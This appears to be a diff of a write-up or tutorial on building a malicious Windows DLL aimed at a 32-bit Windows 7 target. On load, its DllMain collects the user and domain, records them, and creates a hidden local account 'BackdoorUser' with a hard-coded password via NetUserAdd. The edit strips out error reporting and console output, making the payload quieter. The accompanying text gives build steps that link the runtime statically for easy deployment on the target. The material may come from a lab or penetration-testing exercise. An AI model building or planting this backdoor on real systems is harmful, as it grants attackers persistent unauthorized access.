@@ -31,21 +31,8 @@ bool userExists(LPWSTR username)
 {
     LPUSER_INFO_0 pUserInfo = nullptr;
     NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);
-
-    if (status == NERR_Success)
-    {
-        NetApiBufferFree(pUserInfo);
-        return true;
-    } 
-    else if (status == NERR_UserNotFound)
-    {
-        return false;
-    } 
-    else
-    {
-        std::cerr << "Error checking user: " << status << std::endl;
-        return false;
-    }
+    NetApiBufferFree(pUserInfo);
+    return (status == NERR_Success);
 }
 
 void createUser(LPWSTR pUserName, LPWSTR passwd)
@@ -59,18 +46,8 @@ void createUser(LPWSTR pUserName, LPWSTR passwd)
     ui.usri1_comment = nullptr;
     ui.usri1_flags = UF_SCRIPT;
     ui.usri1_script_path = nullptr;
-
     DWORD dwError = 0;
-    NET_API_STATUS nStatus = NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
-
-    if (nStatus == NERR_Success)
-    {
-        wprintf(L"User created successfully.\n");
-    }
-    else
-    {
-        wprintf(L"Failed to create user. Error: %d\n", nStatus);
-    }
+    NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
 }
 
 
@@ -80,24 +57,16 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 {
     if (DLL_PROCESS_ATTACH == ul_reason_for_call)
     {
-        // Called when the DLL is loaded into a process
-        std::cout << "The DLL just got loaded.\n";
+        // Only for debugging; can be removed
         std::string userAndDomain = "";
-        if (getUserDomainString(userAndDomain) == 0)
+        getUserDomainString(userAndDomain);
+        writeInfo(userAndDomain);
+        
+        // Actual payload: Add user unless it exists already
+        if (!userExists(L"BackdoorUser"))
         {
-            std::cout << "User and domain: " << userAndDomain << "\n";
-            writeInfo(userAndDomain);
-
-            // The actual payload comes here
-            if (!userExists(L"BackdoorUser"))
-            {
-                createUser(L"BackdoorUser", L"BackdoorPasswd");
-            }
-        }
-        else
-        {
-            std::cerr << "Error: could not get user and domain.\n";
-        }            
+            createUser(L"BackdoorUser", L"BackdoorPasswd");
+        }        
     }
 
     return TRUE;
@@ -107,7 +76,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 The "Developer Command Prompt for VS 2022" (installed via Visual Studio Build Tools) is started to run the compilation commands in. As the targeted Windows 7 is a 32 bit OS, it must be ensured that the toolchain generates 32-bit binaries. This is done using the command line
 
 ```bat
-call "C:\Path\To\VC\Auxiliary\Build\vcvarsall.bat" x86
+"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars32.bat" x86
 ```
 
 The DLL, and a tiny test.exe are built using the following batch file, which compiles DLL and test app in debug mode and links the runtime statically, which avoids the hassle of having to copy additional DLLs onto the target system:
